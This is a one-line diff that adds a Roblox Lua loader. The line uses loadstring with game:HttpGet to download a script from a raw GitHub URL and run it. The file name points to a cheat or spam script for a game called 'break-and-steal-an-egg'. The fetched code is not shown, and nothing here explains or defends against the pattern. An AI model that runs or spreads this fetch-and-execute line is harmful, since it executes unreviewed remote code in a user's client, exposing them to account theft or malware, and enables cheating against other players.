@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/break-and-steal-an-egg-spam6-a0i3ui43mb9rri.lua"))()
